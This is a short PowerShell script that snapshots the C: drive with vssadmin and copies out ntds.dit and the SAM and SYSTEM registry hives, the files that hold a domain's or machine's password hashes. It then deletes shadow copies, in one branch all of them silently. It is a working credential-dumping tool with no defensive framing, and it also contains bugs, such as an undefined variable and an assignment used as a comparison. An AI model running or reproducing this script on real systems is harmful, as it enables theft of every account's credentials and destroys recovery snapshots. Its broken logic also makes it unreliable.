
########################
## Start of script #####
########################
# Author:Mkemp 
# Date:23-10-16
# Ver:1.0

$state1 = vssadmin list shadows
$snapshot = vssadmin create shadow /for=C:
$state2 = vssadmin list shadows

ForEach($line in $snapshot)
{
    #$line
    if($line.Contains("Shadow Copy ID:"))
    {
        $split = $line.Split(":")
        $vssID = $split[1].Replace('{','').Replace('}','')
        $vssID = $vssID.trim()
    }
    if($line.Contains("Shadow Copy Volume Name:"))
    {
        $split2 = $line.Split(":")
        $volume = $split2[1]
    }
}

if( $state1.Contains("No items found that satisfy the query.") )
{
    #we can assume this is the first snapshot
    cd .\dumps
    $cmd = @"
    copy $volume\windows\ntds\ntds.dit .
"@
    CMD /C $cmd
    $cmd = @"
    copy $volume\windows\system32\config\SYSTEM .
"@
    CMD /C $cmd    
    $cmd = @"
    copy $volume\windows\system32\config\SAM .
"@
    CMD /C $cmd
    reg SAVE HKLM\SYSTEM .\SYS
}

if( $state.Contains("No items found that satisfy the query.") )
{
    $delete1 = vssadmin delete shadows /for=C: /All /Quiet
}
else{
    #not working ????
    $cmd = @"
    vssadmin delete shadows /for=C: /shadow=$vssID
"@
    CMD /C $cmd
}

$state3 = vssadmin list shadows

if($state1 = $state3)
{ "States ok" }

########################
## End of script #######
########################